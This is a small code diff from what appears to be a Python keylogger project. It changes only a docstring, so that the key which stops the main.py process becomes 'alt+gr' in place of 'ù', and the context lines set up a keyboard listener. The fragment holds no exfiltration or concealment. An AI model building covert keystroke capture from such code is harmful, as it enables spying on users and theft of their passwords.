@@ -8,7 +8,7 @@ class KeyLogger:
     def __init__(self):
         """The builder of the 'KeyLogger' class
         Class for creating keyloggers and controlling them.
-        'stopMain' is a boolean which detect the 'ù' and stop the main.py process
+        'stopMain' is a boolean which detect the 'alt+gr' and stop the main.py process
         """
         self.a_stopMain = True
         self.a_listener = keyboard.Listener(on_press=self.on_press)
